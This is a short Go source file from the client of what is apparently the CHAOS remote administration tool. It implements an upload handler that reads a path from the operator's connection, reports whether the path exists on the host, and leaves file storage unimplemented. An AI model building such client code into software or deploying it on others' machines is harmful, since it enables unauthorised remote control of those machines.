package upload

import (
	"encoding/json"
	log "github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/client/app/models"
	"github.com/tiagorlampert/CHAOS/client/app/usecase"
	"github.com/tiagorlampert/CHAOS/client/app/util/network"
	"net"
	"os"
)

type UploadUseCase struct {
	Connection net.Conn
}

func NewUploadUseCase(conn net.Conn) usecase.Upload {
	return &UploadUseCase{
		Connection: conn,
	}
}

func (u UploadUseCase) ValidatePath() {
	data, err := network.Read(u.Connection)
	if err != nil {
		log.WithField("cause", err.Error()).Error("error reading path")
	}

	var response models.Response
	if _, err := os.Stat(string(data)); os.IsNotExist(err) {
		response.Error = true
	}

	marshal, err := json.Marshal(response)
	if err != nil {
		log.Error(err)
	}

	if err = network.Send(u.Connection, marshal); err != nil {
		log.WithField("cause", err.Error()).Error("error sending upload response")
	}
}

func (u UploadUseCase) StoreFile() {
	panic("implement me")
}
